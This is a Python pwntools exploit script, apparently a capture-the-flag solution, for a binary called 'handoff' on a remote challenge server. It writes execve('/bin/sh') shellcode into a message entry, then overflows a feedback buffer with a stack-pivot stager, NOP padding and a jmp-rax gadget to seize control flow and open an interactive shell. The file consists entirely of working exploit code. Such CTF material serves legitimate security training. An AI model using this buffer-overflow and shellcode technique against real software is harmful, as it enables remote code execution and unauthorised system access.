from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

#p = process('./handoff')
p = remote('chatelaine.cylabacademy.net', 11398)
JMP_RAX = 0x40116c
OFFSET_TO_RIP = 20

# Full shellcode — planted into entries[0].msg (option 2, choice=0)
shellcode = asm('''
    mov rax, 0x3b
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

# Stager — planted into feedback (option 3)
stager = asm('sub sp, 0x2e8; jmp rsp')

assert len(stager) <= 7, f"stager too long: {len(stager)}"
assert len(shellcode) <= 64, f"shellcode too long: {len(shellcode)}"

padding = b'\x90' * (OFFSET_TO_RIP - len(stager))

print(f"[*] stager length: {len(stager)}")
print(f"[*] stager bytes: {stager.hex()}")
print(f"[*] shellcode length: {len(shellcode)}")
print(f"[*] padding length: {len(padding)}")
print(f"[*] total payload length: {len(stager + padding + p64(JMP_RAX))}")

# Break after option 2's fgets (verify shellcode lands), and at the ret
#gdb.attach(p, '''
#    break *0x4013b1
#    break *0x4013ed
#    break *0x40140e
#    continue
#''')

# --- Option 1: create entries[0] ---
p.recvuntil(b'3. Exit the app\n')
p.sendline(b'1')
p.recvuntil(b'name: \n')
p.sendline(b'CornPop')

# --- Option 2: write shellcode into entries[0].msg ---
p.recvuntil(b'3. Exit the app\n')
p.sendline(b'2')
p.recvuntil(b'to?\n')
p.sendline(b'0')
p.recvuntil(b'them?\n')
p.sendline(shellcode)

# --- Option 3: overflow feedback with stager + padding + jmp_rax ---
p.recvuntil(b'3. Exit the app\n')
p.sendline(b'3')
p.recvuntil(b'appreciate it: \n')
p.sendline(stager + padding + p64(JMP_RAX))

p.interactive()
